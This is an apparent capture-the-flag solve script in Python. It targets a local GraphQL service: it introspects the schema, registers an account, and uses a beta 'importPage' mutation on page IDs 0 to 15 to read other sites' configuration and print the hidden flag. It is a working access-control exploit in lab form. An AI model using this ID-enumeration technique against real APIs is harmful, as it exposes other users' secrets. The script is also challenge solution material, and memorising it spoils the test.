from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import requests

BASE_URL = "http://localhost:8000"

adapter = HTTPAdapter(max_retries=Retry(
    total=3,
    backoff_factor=1,
    status_forcelist=[429],
    method_whitelist=["POST"]
))
sess = requests.Session()
sess.mount("https://", adapter)
sess.mount("http://", adapter)

# 1. Introspect
introspected = sess.post(f"{BASE_URL}/graphql", json={
    'query': """query introspect {
      __schema {
        types { kind name description fields { name description } }
      }
    }"""
}).json()['data']['__schema']['types']

# Check required gadgets exist
page_type = next(o for o in introspected if o['name'] == 'Page')
mutation_type = next(o for o in introspected if o['name'] == 'Mutation')

owner_site_field = next(f for f in page_type['fields'] if f['name'] == 'ownerSite')
site_refs_field = next(f for f in page_type['fields'] if f['name'] == 'siteRefs')
import_page_mut = next(f for f in mutation_type['fields'] if f['name'] == 'importPage')

assert 'beta' in owner_site_field['description']
assert 'beta' in site_refs_field['description']
assert 'beta' in import_page_mut['description']

# 2. Signin
token = sess.post(f"{BASE_URL}/graphql", json={
    'query': """mutation register {
        loginOrRegister(username: "solve", password: "solve83e5bff44ba10605")
    }"""
}).json()['data']['loginOrRegister']

# 3. Get our site id
me = sess.post(f"{BASE_URL}/graphql", json={
    'query': """query me {
        me { id sites { id } }
    }"""
}, headers={"Authorization": f"Bearer {token}"}).json()['data']['me']

# 3. Import the a few pages into our site
for page in range(0, 16):
    sess.post(f"{BASE_URL}/graphql", json={
        'query': """mutation import($pageId: ID!, $siteId: ID!) {
            importPage(pageId: $pageId, siteId: $siteId)
        }""",
        'variables': {'pageId': page, 'siteId': me['sites'][0]['id']},
    }, headers={'Authorization': f'Bearer {token}'})

# 4. Check our sites pages
pages = sess.post(f"{BASE_URL}/graphql", json={
    'query': """query sitepage($site: ID!) {
        site(id: $site) {
            id
            pages {
                id
                ownerSite {
                    id
                    name
                    config { key value }
                }
            }
        }
    }""",
    'variables': {'site': me['sites'][0]['id']}
}, headers={'Authorization': f'Bearer {token}'}).json()['data']['site']['pages']

# 5. Find the flag in the configs
for page in pages:
    for conf in page['ownerSite']['config']:
        if conf['key'] == 'flag':
            print(conf['value'])
            break
